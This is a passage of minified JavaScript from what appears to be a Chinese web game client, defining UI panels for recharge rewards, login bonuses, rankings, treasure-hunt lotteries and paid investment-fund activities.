o=this.ins.getActivityDataById(this.actIds[this.actIndex]);this.rechargeCoumt.text=gettext("今日已充值{0}元宝",Math.floor(o.chongzhiNum))},e.prototype.tabRp=function(){if(!this.actIds||!this.actIds.length){if(this.actIds=[],this.actIds.push(this.activityID),this.cfg||this.initConf(),!this.cfg[1]||!this.cfg[1].activityID)return;for(var t=1;t<=this.cfg[1].activityID.length;t++)this.actIds.push(this.cfg[1].activityID[t-1])}for(var t=0;3>t;t++){var e=this.actIds[t],i=this.ins.getActivityDataById(e);if(i.rp.v)return!0}return!1},e}(r.BaseView);window.OSATarget3Panel10=d,__reflect(d.prototype,"OSATarget3Panel10",[]);var c=function(t){function e(){var e=t.call(this)||this;return e.skinName="KMHRechargeItem",e.init(),e}return __extends(e,t),e.prototype.childrenCreated=function(){t.prototype.childrenCreated.call(this)},e.prototype.init=function(){this.reward.itemRenderer=l.ItemBase,this.get.addEventListener(egret.TouchEvent.TOUCH_END,this.onClick,this)},e.prototype.onClick=function(){if(this.data&&this.data instanceof f){if(this.data.already)return void u.TipsCT.ins().showTips(gettext("已购买"));if(this.data.unready)return void u.TipsCT.ins().showTips(gettext("已过期"));if(3==this.data.type){if(!this.data.redPoint)return void win.open("RechargeWin")}else if(1==this.data.type&&!this.data.redPoint)return void u.TipsCT.ins().showTips(gettext("未达到条件"));this.ins.sendReward(this.data.id,this.data.index)}},e.prototype.dataChanged=function(){if(this.data&&this.data instanceof f&&(this.unready.visible=this.data.unready,this.already.visible=this.data.already,this.redPoint.visible=this.data.redPoint,this.reward.dataProvider=new eui.ArrayCollection(this.data.reward),this.ins=p.Activity.ins(),3==this.data.type?(this.unready.visible?this.get.visible=!1:this.get.visible=!this.already.visible,this.day.text=gettext("第{0}天",this.data.day),o.DisplayUtils.removeFromParent(this.daySchedule),this.get.parent||this.buyGroup.addChild(this.get)):1==this.data.type&&(this.unready.visible?this.get.visible=!1:(this.get.visible=this.redPoint.visible,this.get.parent||this.buyGroup.addChild(this.get)),this.unready.visible=!1,this.day.text=gettext("连充{0}天",this.data.day),this.already.visible?o.DisplayUtils.removeFromParent(this.daySchedule):this.daySchedule.parent||this.buyGroup.addChild(this.daySchedule)),this.get.visible||o.DisplayUtils.removeFromParent(this.get),3!=this.data.type||this.data.redPoint?this.get.label=gettext("领取"):this.get.label=gettext("充值"),this.daySchedule.parent)){var t=this.ins.getActivityDataById(this.data.id);this.daySchedule.textFlow=s.TextFlowMaker.generateTextFlow1(gettext("累充|C:${color}&T:{0}|/{1}天",t.dabiao[this.data.index-1],this.data.day))}},e.prototype.destruct=function(){this.removeEventListener(egret.TouchEvent.TOUCH_END,this.onClick,this)},e}(a.BaseItemRender);window.KaiMenItem=c,__reflect(c.prototype,"KaiMenItem",[]);var f=function(){function t(){}return t}();window.KaiMenData=f,__reflect(f.prototype,"KaiMenData",[]),window.KaiMenItem=c,window.OSATarget3Panel10=d},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.OSATarget3Panel14=void 0;var n=i(0),o=i(29),s=i(9),a=i(55),r=i(560),l=i(30),h=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="osa3p14skin",e}return __extends(e,t),e.prototype.skinComplete=function(){this.eList.itemRenderer=r.OSATarget3Panel14Item,this.eList.dataProvider=this.listDP=new eui.ArrayCollection},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];observe(this,this.update,s.Activity.ins().postActivityIsGetAwards);var i=n.GlobalConfig.ActivityBtnConfig[this.activityID];this.bg.source=(null===i||void 0===i?void 0:i.bgImg)||"",this.title.source=(null===i||void 0===i?void 0:i.titleImg)||"",this.update()},e.prototype.update=function(){var t=[],e=new l.RewardData;e.count=0,e.id=2,e.type=0;var i={Id:this.activityID,rewards:[e],sum:0},o=new l.RewardData;o.count=0,o.id=401402,o.type=1;var s={Id:this.activityID,rewards:[o],sum:0},a=n.GlobalConfig.ActivityType3Config[this.activityID];for(var r in a)t.push(a[r]),i.sum||(i.sum=a[r].sum),e.id=a[r].rewards[0].id,e.type=a[r].rewards[0].type,e.count+=a[r].rewards[0].count,s.sum||(s.sum=a[r].sum),a[r].rewards[1]&&401402==a[r].rewards[1].id&&(o.id=a[r].rewards[1].id,o.type=a[r].rewards[1].type,o.count+=a[r].rewards[1].count);t.sort(this.sort),this.listDP.replaceAll(t),this.des.text=n.GlobalConfig.ActivityConfig[this.activityID].desc||"",Timer.start(1e3,0,this.setTime,this),this.setTime()},e.prototype.setTime=function(){var t=s.Activity.ins().getActivityDataById(this.activityID);t&&(this.actTime.text=t.getRemainTime())},e.prototype.sort=function(t,e){var i=s.Activity.ins().getActivityDataById(t.Id);return(i.recrod>>t.index&1)==s.Activity.CanGet&&(i.recrod>>e.index&1)==s.Activity.Geted?1:(i.recrod>>t.index&1)==s.Activity.Geted&&(i.recrod>>e.index&1)==s.Activity.CanGet?-1:a.Algorithm.sortAsc(t.index,e.index)},e.prototype.removeDisplay=function(){},e.prototype.tabRp=function(){var t=s.Activity.ins().getActivityDataById(this.activityID);return t?t.rp.v||!1:!1},e}(o.ActivityPanel);e.OSATarget3Panel14=h,window.OSATarget3Panel14=h,__reflect(h.prototype,"OSATarget3Panel14",[]),window.OSATarget3Panel14=h},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.OSATarget3Panel14Item2=void 0;var n=i(3),o=i(9),s=i(0),a=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="Days42BigRewardItemSkin",e}return __extends(e,t),e.prototype.dataChanged=function(){if(this.data&&this.skin){this.days.text="";var t=this.data;t.rewards.length>1?this.reward.data=t.rewards[1]:this.reward.data=t.rewards[0];var e=t.sum*Object.keys(s.GlobalConfig.ActivityType3Config[t.Id]).length,i=o.Activity.ins().getActivityDataById(t.Id);i&&(i.awardays>=e?this.state.visible=!0:this.state.visible=i.awardays>=t.index)}},e}(n.BaseItemRender);e.OSATarget3Panel14Item2=a,window.OSATarget3Panel14Item2=a,__reflect(a.prototype,"OSATarget3Panel14Item2",[]),window.OSATarget3Panel14Item2=a},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.OSATarget3Panel15=void 0;var n=i(0),o=i(29),s=i(9),a=i(561),r=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="osa3p15skin",e}return __extends(e,t),e.prototype.skinComplete=function(){this.eList.itemRenderer=a.OSATarget3Panel15Item,this.eList.dataProvider=this.listDP=new eui.ArrayCollection},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];observe(this,this.update,s.Activity.ins().postActivityIsGetAwards),this.update()},e.prototype.update=function(){var t=n.GlobalConfig.ActivityType3Config[this.activityID],e=s.Activity.ins().getActivityDataById(this.activityID),i=[],o=[],a=[];for(var r in t)if(e.curOpenDay()+1==t[r].day){var l=e.getRewardStateById(t[r].index);switch(l){case s.Activity.NotReached:i.push(t[r]);break;case s.Activity.CanGet:o.push(t[r]);break;case s.Activity.Geted:a.push(t[r])}}var h=o.concat(i,a);this.listDP.replaceAll(h)},e}(o.ActivityPanel);e.OSATarget3Panel15=r,window.OSATarget3Panel15=r,__reflect(r.prototype,"OSATarget3Panel15",[]),window.OSATarget3Panel15=r},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.OSATarget40Panel=void 0;var n=i(29),o=i(9),s=i(0),a=i(203),r=i(128),l=i(10),h=i(88),u=i(4),p=i(270),d=i(71),c=function(t){function e(){var e=t.call(this)||this;return e._sn_="osa4pskin",e}return __extends(e,t),e.prototype.skinComplete=function(){this.eList.itemRenderer=p.OSATarget4Item,this.eList.dataProvider=this.listDP=new eui.ArrayCollection},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.addTouchEvent(this,this.onClick),observe(this,this.updateData,o.Activity.ins().postGetDaBiaoInfo),observe(this,this.initInfo,h.Rank.ins().postRankingData),this.cfg=s.GlobalConfig.ActivityType4Config[this.activityID];var i=this.cfg[1];i&&i.rankType==d.RankDataType.TYPE_HF_XIAOFEI?o.Activity.ins().sendDabiaoInfo(this.activityID):h.Rank.ins().sendGetRankingData(i.rankType)},e.prototype.initInfo=function(t){this.model=t,this.updateData()},e.prototype.updateData=function(){this.actData=o.Activity.ins().getActivityDataById(this.activityID),this.updateView(),this.updateList()},e.prototype.updateList=function(){var t;this.cfg[0].rankType;if(t=this.model?this.model.getDataList():o.Activity.ins().rankInfoList){var e=[];for(var i in t)for(var n in this.cfg)if(this.cfg[n].ranking&&!e[this.cfg[n].ranking]&&this.cfg[n].value<=t[i].value){t[i].realPos=this.cfg[n].ranking,e[this.cfg[n].ranking]=t[i];break}var s,a=[];for(var n in this.cfg)this.cfg[n].ranking&&(a.push([this.cfg[n],e[+n]]),e[+n]&&e[+n].id==u.ActorCC.actorID&&(s=e[+n].realPos));this.listDP.replaceAll(a),this.eMyLab.text=this.eMyRank.text="",s?this.eMyLab.text=s+"":this.eMyRank.text=gettext("{0}名以后",20)}},e.prototype.updateView=function(){this.eImg.source="act4_t"+this.cfg[0].rankType,this.cfg[0].titleEffName?(this.eMc.data=RES_DIR_EFF+this.cfg[0].titleEffName,this.eTitleImg.source=""):(this.eMc.data=null,this.eTitleImg.source=RES_DIR_CHENGHAO+this.cfg[0].titleName);var t=Object.keys(this.cfg).length-1,e="";if(this.cfg[t].value&&(e+=gettext("上榜前{0}且{1}达到\n{2}\n可获得排名奖励-绝版称号",t,a.ActivityType4Data.getTypeDesc(this.activityID),a.ActivityType4Data.getTarStr(this.cfg[t]))),this.eTips1.text=e,e="",this.cfg[1].rewards2){var i=this.cfg[1],n=i.rewards2[0].id,o=s.GlobalConfig.ItemConfig[n],h=r.Title.getTitleCfgByItemId(o.id),u=l.ItemUtil.getAttrPower(h.attrs),p=[];h.sysadd?h.sysadd.length:0;e=gettext("第一名:{0}\n战力+{1}\n{2}",o.name,u,p)}if(this.eTips2.text=e,e="",this.cfg[t].rewards2){var n=this.cfg[1].rewards2[0].id,o=s.GlobalConfig.ItemConfig[n],h=r.Title.getTitleCfgByItemId(o.id),u=l.ItemUtil.getAttrPower(h.attrs),p=[];h.sysadd?h.sysadd.length:0;e=gettext("前{0}名:{1}\n战力+{2}\n{3}",t,o.name,u,p)}this.eTips3.text=e},e.prototype.onClick=function(t){switch(t.target){case this.eBtn:this.cfg[0].turn&&win.open(this.cfg[0].turn[0],this.cfg[0].turn.slice(1))}},e}(n.ActivityPanel);e.OSATarget40Panel=c,window.OSATarget40Panel=c,__reflect(c.prototype,"OSATarget40Panel",[]),window.OSATarget40Panel=c},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.OSATarget40Panel2=void 0;var n=i(19),o=i(11),s=i(0),a=i(36),r=i(4),l=i(6),h=i(10),u=i(518),p=i(111),d=i(175),c=i(63),f=i(9),g=i(29),m=i(562),v=i(564),y=function(t){function e(){var e=t.call(this)||this;return e.boxSum=0,e.boxList=[],e.huntType=0,e._sn_="richtreasure",e.addTouchEvent(e,e.onClick),e}return __extends(e,t),e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.list1.itemRenderer=m.OSATarget40Item2,this.showList1.itemRenderer=o.ItemBase,this.showList2.itemRenderer=o.ItemBase,this.observe(r.ActorCC.postYbChange,this.updateYb),this.observe(l.BagCT.ins().postItemAdd,this.updateYb),this.observe(l.BagCT.ins().postItemChange,this.updateYb),this.observe(l.BagCT.ins().postItemDel,this.updateYb),this.observe(f.Activity.ins().postActivityIsGetAwards,this.updateData),this.cfg=s.GlobalConfig.ActivityType40Config[this.activityID],this.mallCfg=s.GlobalConfig.ActivityType40_1Config[this.activityID],this.lb_GaiLv.textFlow=HtmlUtil.parse(HtmlUtil.underLine(gettext("概率公示"))),this.addTouchEvent(this.lb_GaiLv,this.showGaiLv),this.update(),this.updateData(),this.updateYb()},e.prototype.updateData=function(){this.actData=f.Activity.ins().getActivityDataById(this.activityID),this.redPoint.visible=this.actData.scoreReward(),this.setBoxData()},e.prototype.update=function(){this.boxSum=0,this.boxList=[];for(var t in this.mallCfg)this.mallCfg[t].lotteryCount&&(this.boxSum++,this.boxList.push(this.mallCfg[t]));for(var e=0;e<this.boxSum;e++)this.addTouchEvent(this["box"+e],this.onTab);var i=[],n=[],o=[];for(var s in this.cfg)switch(this.cfg[s].showPosition){case 1:n.push(this.cfg[s].showDrop);break;case 2:o.push(this.cfg[s].showDrop);break;case 3:i.push(this.cfg[s].showDrop)}n=n.concat(n).concat(n),o=o.concat(o).concat(o),this.showList1.dataProvider=new eui.ArrayCollection(n),this.showList2.dataProvider=new eui.ArrayCollection(o),this.list1.dataProvider=new eui.ArrayCollection(i),this.showListEff()},e.prototype.updateYb=function(){var t=l.BagCT.ins().getBagGoodsCountById(l.BagCT.BAG_TYPE_OTHTER,this.cfg[1].itemId);this.num0.text=this.num1.text=t+"",this.icon0.source=this.icon1.source=h.ItemUtil.getItemSource(s.GlobalConfig.ItemConfig[this.cfg[1].itemId]),this.cfg[1].yb?r.ActorCC.yb>=10*this.cfg[1].yb||r.ActorCC.yb>=this.cfg[1].yb:this.cfg[1].itemId},e.prototype.onTab=function(t){for(var e=0;e<this.boxSum;e++){var i=this.boxList[e].index;if(t.target==this["box"+e]&&i){if(1!=this.actData.getStateByIndex(i)){win.open(u.HuntBoxsTips,i,4,this.activityID);break}f.Activity.ins().sendReward(this.activityID,0,3,i);break}}},e.prototype.onClick=function(t){switch(t.target){case this.eShopBtn:win.open(v.OSATarget40JFStoreWin,this.activityID);break;case this.buy1:this.buyHunt(0);break;case this.buy10:this.buyHunt(1)}},e.prototype.buyHunt=function(t){var e=this;this.huntType=t;var i=l.BagCT.ins().getBagGoodsCountById(l.BagCT.BAG_TYPE_OTHTER,this.cfg[1].itemId),o=t?10:1;l.BagCT.ins().getAllSurplusCount()<20?win.open(d.BagFullTipsWin,20):i>=o?f.Activity.ins().sendReward(this.activityID,0,t?2:1):this.cfg[1].yb&&this.cfg[1].yb>0?p.HuntWarnBuyWin.showBuyWarn("OSATarget40Panel_"+this.activityID+"-HuntResultWin"+(t?10:0),function(){n.GlobalFun.checkCost(e.cfg[1].yb*o,a.MoneyConst.yuanbao)&&f.Activity.ins().sendReward(e.activityID,0,t?2:1)},gettext("是否消耗{0}元宝购买{1}*{2}",this.cfg[1].yb*o,s.GlobalConfig.ItemConfig[this.cfg[1].itemId].name,o)):c.WarnCT.ins().setBuyGoodsWarn(this.cfg[1].itemId,1)},e.prototype.setBoxData=function(){this.times.text=this.actData.lottery+"";for(var t=0;t<this.boxSum;t++){var e=this.boxList[t];if(!e)return;switch(this["done"+t].visible=!0,this.actData.getStateByIndex(e.index)){case 0:this["time"+t].text=e.lotteryCount+gettext("点"),this["done"+t].text="",this["box"+t].source="ttxunbao_box2",this["boxPoint"+t].visible=!1;break;case 1:this["time"+t].text="",this["done"+t].text=gettext("可领取"),this["box"+t].source="ttxunbao_box1",this["boxPoint"+t].visible=!0;break;case 2:this["time"+t].text="",this["done"+t].text=gettext("已领取"),this["box"+t].source="ttxunbao_box2",this["boxPoint"+t].visible=!1}}},e.prototype.showListEff=function(){var t=this;this.showList1.scrollH=0;var e=this.showList1.dataProvider.length/3;egret.Tween.removeTweens(this.showList1);var i=egret.Tween.get(this.showList1,{loop:!0});i.to({scrollH:96*e},s.GlobalConfig.ClientGlobalConfig.time).call(function(){t.showList1.scrollH=0});var n=this.showList2.dataProvider.length/3;this.showList2.scrollH=96*n,egret.Tween.removeTweens(this.showList2);var o=egret.Tween.get(this.showList2,{loop:!0});o.to({scrollH:0},s.GlobalConfig.ClientGlobalConfig.time).call(function(){t.showList2.scrollH=96*n})},e.prototype.showGaiLv=function(){win.open("CommonHelpWin",s.GlobalConfig.HelpInfoConfig[s.GlobalConfig.ActivityType40Config[this.activityID][1].dropShow].text)},e.prototype.enterFrame=function(){this.actData&&(this.eTime.text=this.actData.getRemainTime())},e}(g.ActivityPanel);e.OSATarget40Panel2=y,window.OSATarget40Panel2=y,__reflect(y.prototype,"OSATarget40Panel2",[]),window.OSATarget40Panel2=y},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.OSATarget41Item=void 0;var n=i(3),o=i(11),s=i(35),a=function(t){function e(){var e=t.call(this)||this;return e._sn_="OSAChaozhitouziitemSkin",e.eList.itemRenderer=o.ItemBase,e}return __extends(e,t),e.prototype.dataChanged=function(){if(this.data){var t=this.data;this.eName.visible=!1;var e="";switch(t.type){case 8:e=gettext("等级：{0}",t.target);break;case 19:e=gettext("等级：{0}转",t.target);break;case 100:e=gettext("登录{0}天",t.target)}this.eInfo.text=e,this.eList.dataProvider=new eui.ArrayCollection(t.reward);var i=s.TaskCT.ins().getInvestmentTask(t.id,t.index);if(this.eBtn.enabled=!1,this.eBtn.label=gettext("未完成"),i)switch(this.redPoint.visible=1==i.status,i.status){case 0:this.eBtn.enabled=!1,this.eBtn.label=gettext("未完成");break;case 1:this.eBtn.enabled=!0,this.eBtn.label=gettext("领取");break;case 2:this.eBtn.enabled=!1,this.eBtn.label=gettext("已领取")}}},e}(n.BaseItemRender);e.OSATarget41Item=a,window.OSATarget41Item=a,__reflect(a.prototype,"OSATarget41Item",[]),window.OSATarget41Item=a},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.OSATarget41Panel=void 0;var n=i(24),o=i(5),s=i(1),a=i(0),r=i(25),l=i(35),h=i(2),u=i(9),p=i(253),d=function(t){function e(){var e=t.call(this)||this;return e.cfgIndex=28,e}return __extends(e,t),e.prototype.skinComplete=function(){this.listDP=new eui.ArrayCollection,this.dailyReward.itemRenderer=p.OSATarget41Item28,this.dailyReward.dataProvider=this.listDP,this.dailyReward.useVirtualLayout=!0,this.addTouchEvent(this,this.onClick)},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];observe(this,this.update,l.TaskCT.ins().postInvestmentTaskData),observe(this,this.update,u.Activity.ins().postActivityIsGetAwards);var i=a.GlobalConfig.ActivityType41Config[this.cfgIndex];this.desc1.textFlow=o.TextFlowMaker.generateTextFlow(gettext("豪华版基金|C:0x40df38&T:13倍返利|, ")),this.desc2.textFlow=o.TextFlowMaker.generateTextFlow(gettext("总共返还|C:0xbd600d&T:12980|元宝")),this.lbYb.textFlow=o.TextFlowMaker.generateTextFlow(gettext("总共获得|C:0x40df38&T:{0}|元宝",i.buyMoney)),this.update()},e.prototype.update=function(){this.data=u.Activity.ins().activityData[this.cfgIndex],this.updateView()},e.prototype.updateView=function(){var t=a.GlobalConfig.ActivityType41Config[this.cfgIndex],e=n.CommonUtils.objectToArray(a.GlobalConfig.InvestmentTaskConfig[t.taskid]);this.listDP.replaceAll(e),this.eBtn.label=this.data.hasBuy?gettext("已购买"):gettext("{0}元",t.buyMoney/100*r.Recharge.getChannelMulti()),this.eBtn.enabled=!this.data.hasBuy},e.prototype.onClick=function(t){switch(t.target){case this.eBtn:if(urlParam.appid){var e=a.GlobalConfig.ActivityConfig[this.activityID];if(e&&e.onlyappid){var i=!1;for(var n in e.onlyappid)urlParam.appid==e.onlyappid[n]&&(i=!0);if(!i)return void(e.onlyappidTip?h.TipsCT.ins().showTips(e.onlyappidTip):h.TipsCT.ins().showTips(gettext("|C:0xf3311e&T:关注公众号转端获得奖励|")))}}var o=a.GlobalConfig.ActivityType41Config[this.cfgIndex];r.Recharge.ins().sendPayOrder(o.rid)}},__decorate([delayCall()],e.prototype,"update",null),e}(s.BaseView);e.OSATarget41Panel=d,window.OSATarget41Panel=d,__reflect(d.prototype,"OSATarget41Panel",[]),window.OSATarget41Panel=d},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.Item41=e.OSATarget41Panel1=void 0;var n=i(66),o=i(3),s=i(0),a=i(25),r=i(35),l=i(2),h=i(9),u=i(56),p=i(29),d=i(565),c=function(t){function e(){var e=t.call(this)||this;return e._sn_="osa41p1skin",e.actData=[],e.actData=h.Activity.ins().getActivityDataByType(u.ActivityDataType._41,u.ActSubType.TYPE_1),e.actData?(e.activityType=e.actData[0].type,e.activityID=e.actData[0].id,e):e}return __extends(e,t),e.prototype.skinComplete=function(){this.listAC=new eui.ArrayCollection,this.eTabAC=new eui.ArrayCollection,this.list.itemRenderer=d.OSATarget41Item1,this.eTab.itemRenderer=f,this.list.dataProvider=this.listAC=new eui.ArrayCollection([]),this.eTab.dataProvider=this.eTabAC,this.eTab.addEventListener(eui.UIEvent.CHANGE,this.CHANGE,this),this.eTabAC.replaceAll(this.actData)},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];observe(this,this.updateView,r.TaskCT.ins().postInvestmentTaskData,r.TaskCT.ins().postOneInvestmentTask),this.addTouchEvent(this.eBtn,this.onClick),this.updateView()},e.prototype.updateView=function(){var t=s.GlobalConfig.ActivityType41Config[this.activityID],e=h.Activity.ins().activityData[this.activityID],i=s.GlobalConfig.InvestmentTaskConfig[t.taskid],o=[];for(var l in i){var u=i[l],p=r.TaskCT.ins().getInvestmentTask(u.id,u.index);o.push({id:u.id,reward:u.reward,target:u.target,activityID:this.activityID,index:u.index,status:(null===p||void 0===p?void 0:p.status)||0})}this.listAC.replaceAll(o);var d=n.PayUtils.getPayUnitStr(a.Recharge.ins().getCashByRid(t.rid)/100,urlParam.payUnit);this.btnLabel.text=e.hasBuy?gettext("已购买"):gettext("{0}激活",d),this.eBtn.enabled=!e.hasBuy},e.prototype.CHANGE=function(t){this.activityType=this.actData[this.eTab.selectedIndex].type,this.activityID=this.actData[this.eTab.selectedIndex].id,this.updateView()},e.prototype.onClick=function(t){switch(t.currentTarget){case this.eBtn:var e=s.GlobalConfig.ActivityType41Config[this.activityID];if(urlParam.appid){var i=s.GlobalConfig.ActivityConfig[this.activityID];if(i&&i.onlyappid){var n=!1;for(var o in i.onlyappid)urlParam.appid==i.onlyappid[o]&&(n=!0);if(!n)return void(i.onlyappidTip?l.TipsCT.ins().showTips(i.onlyappidTip):l.TipsCT.ins().showTips(gettext("|C:0xf3311e&T:关注公众号转端获得奖励|")))}}a.Recharge.ins().sendPayOrder(e.rid)}},e.prototype.tabRp=function(){var t=h.Activity.ins().activityData[this.activityID];return t?t.rp.v:!1},e}(p.ActivityPanel);e.OSATarget41Panel1=c,window.OSATarget41Panel1=c,__reflect(c.prototype,"OSATarget41Panel1",[]);var f=function(t){function e(){return null!==t&&t.apply(this,arguments)||this
}return __extends(e,t),e.prototype.dataChanged=function(){var t=this.data;this.labelDisplay.text=s.GlobalConfig.ActivityBtnConfig[t.id].title||""},e}(o.BaseItemRender);e.Item41=f,window.Item41=f,__reflect(f.prototype,"Item41",[]),window.OSATarget41Panel1=c},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.OSATarget41Panel2=void 0;var n=i(0),o=i(9),s=i(35),a=i(25),r=i(2),l=i(566),h=i(29),u=i(4),p=i(26),d=i(5),c=i(30),f=i(54),g=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="osa41p2skin",e}return __extends(e,t),e.prototype.skinComplete=function(){this.listDP=new eui.ArrayCollection,this.eList.itemRenderer=l.OSATarget41Panel2Item,this.eList.dataProvider=this.listDP,this.addTouchEvent(this,this.onClick)},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];observe(this,this.update,s.TaskCT.ins().postInvestmentTaskData,o.Activity.ins().postActivityIsGetAwards,u.ActorCC.postLevelChange,p.ZsCT.ins().postZsLv,f.Fb2CT.ins().postUpDataInfo),this.update()},e.prototype.update=function(){this.data=o.Activity.ins().activityData[this.activityID],this.setTime(),this.updateView()},e.prototype.updateView=function(){var t,e=n.GlobalConfig.ActivityType41Config[this.activityID],i=n.GlobalConfig.InvestmentTaskConfig[e.taskid],o=[],r=[];for(var l in i){var h=s.TaskCT.ins().getInvestmentTask(i[l].id,i[l].index);h&&2==h.status?r.push(i[l]):o.push(i[l]),i[l].tarName&&(t=i[l])}if(this.listDP.replaceAll(o.concat(r)),this.eBtn.label=this.data.hasBuy?gettext("已投资"):gettext("投资{0}元",e.buyMoney/n.GlobalConfig.ClientGlobalConfig.rate*a.Recharge.getChannelMulti()),this.eBtn.enabled=!this.data.hasBuy,this.eTurn.visible=this.eIcon.visible=this.eName.visible=this.eLimit.visible=!!t,this.eTurn.textFlow=d.TextFlowMaker.generateTextFlow1("|U:&T:"+e.turnTxt+"|"),t){this.eIcon.data=t.extra;var u="";u=0==t.extra.type?c.RewardData.getCurrencyName(t.extra.id):n.GlobalConfig.ItemConfig[t.extra.id].name,this.eName.text=u,this.eLimit.text=t.tarName}this.eImg.source=e.show},e.prototype.onClick=function(t){if(t.target instanceof eui.Button&&t.target.parent.parent instanceof l.OSATarget41Panel2Item){if(!this.data.hasBuy)return void r.TipsCT.ins().showTips(gettext("进行投资后可领取，领取失败"));var e=t.target.parent.parent.data;return void s.TaskCT.ins().sendInvestmentTaskData(e.id,e.index)}var i=n.GlobalConfig.ActivityType41Config[this.activityID];switch(t.target){case this.eBtn:if(urlParam.appid){var o=n.GlobalConfig.ActivityConfig[this.activityID];if(o&&o.onlyappid){var h=!1;for(var u in o.onlyappid)urlParam.appid==o.onlyappid[u]&&(h=!0);if(!h)return void(o.onlyappidTip?r.TipsCT.ins().showTips(o.onlyappidTip):r.TipsCT.ins().showTips(gettext("|C:0xf3311e&T:关注公众号转端获得奖励|")))}}a.Recharge.ins().sendPayOrder(i.rid);break;case this.eTurn:win.open.apply(win,__spreadArrays([i.turn[0]],i.turn.slice(1)))}},e.prototype.setTime=function(){this.data&&(this.eTime.text=this.data.hasBuy?"":this.data.getRemainTime())},__decorate([delayCall()],e.prototype,"update",null),e}(h.ActivityPanel);e.OSATarget41Panel2=g,window.OSATarget41Panel2=g,__reflect(g.prototype,"OSATarget41Panel2",[]),window.OSATarget41Panel2=g},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.OSATarget41Panel3=void 0;var n=i(0),o=i(9),s=i(35),a=i(25),r=i(2),l=i(29),h=i(567),u=i(66),p=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="osa41p3Skin",e}return __extends(e,t),e.prototype.skinComplete=function(){this.listDP=new eui.ArrayCollection,this.dailyReward.itemRenderer=h.OSATarget41Panel3Item,this.dailyReward.dataProvider=this.listDP,this.addTouchEvent(this,this.onClick)},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];observe(this,this.update,s.TaskCT.ins().postInvestmentTaskData),observe(this,this.update,o.Activity.ins().postActivityIsGetAwards),this.update()},e.prototype.update=function(){this.data=o.Activity.ins().activityData[this.activityID],this.setTime(),this.updateView()},e.prototype.updateView=function(){var t,e,i=n.GlobalConfig.ActivityType41Config[this.activityID],o=n.GlobalConfig.InvestmentTaskConfig[i.taskid],r=[],l=[];for(var h in o)e=s.TaskCT.ins().getInvestmentTask(o[h].id,o[h].index),e&&2==e.status?l.push({cfg:o[h],actId:this.activityID}):r.push({cfg:o[h],actId:this.activityID});this.listDP.replaceAll(r.concat(l));var p=a.Recharge.ins().getCashByRid(i.rid)/100;this.eBtn.label=u.PayUtils.getPayUnitStr(p,urlParam.payUnit),this.txtProgress.text=((null===e||void 0===e?void 0:e.param)?null===e||void 0===e?void 0:e.param:0)+"",this.eBtn.visible=(null===(t=this.data)||void 0===t?void 0:t.hasBuy)?!1:!0},e.prototype.onClick=function(t){var e=n.GlobalConfig.ActivityType41Config[this.activityID];switch(t.target){case this.eBtn:if(urlParam.appid){var i=n.GlobalConfig.ActivityConfig[this.activityID];if(i&&i.onlyappid){var o=!1;for(var s in i.onlyappid)urlParam.appid==i.onlyappid[s]&&(o=!0);if(!o)return void(i.onlyappidTip?r.TipsCT.ins().showTips(i.onlyappidTip):r.TipsCT.ins().showTips(gettext("|C:0xf3311e&T:关注公众号转端获得奖励|")))}}a.Recharge.ins().sendPayOrder(e.rid)}},e.prototype.setTime=function(){},__decorate([delayCall()],e.prototype,"update",null),e}(l.ActivityPanel);e.OSATarget41Panel3=p,window.OSATarget41Panel3=p,__reflect(p.prototype,"OSATarget41Panel3",[]),window.OSATarget41Panel3=p},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.OSATarget42Item1=e.OSATarget42Panel1=void 0;var n=i(5),o=i(3),s=i(11),a=i(0),r=i(6),l=i(2),h=i(9),u=i(29),p=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="osa42p1skin",e}return __extends(e,t),e.prototype.skinComplete=function(){this.list.itemRenderer=d,this.list.dataProvider=this.listAc=new eui.ArrayCollection([]);var t=a.GlobalConfig.ActivityBtnConfig[this.activityID];this.titleImg.source=t.titleImg,this.topImg.source=t.bgImg},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];observe(this,this.updateView,h.Activity.ins().postRewardResult,h.Activity.ins().postChangePage),this.updateView()},e.prototype.updateView=function(){var t=[],e=a.GlobalConfig.ActivityType42Config[this.activityID],i=h.Activity.ins().activityData[this.activityID];for(var n in e){var o=e[n],s=i.getAchieveInfo(o.index);t.push({activityID:this.activityID,reward:o.reward,target:o.target,singal:null===s||void 0===s?void 0:s.isGot,targetNum:null===s||void 0===s?void 0:s.times,desc:o.name,index:o.index})}this.listAc.replaceAll(t)},e.prototype.tabRp=function(){var t=h.Activity.ins().activityData[this.activityID];return 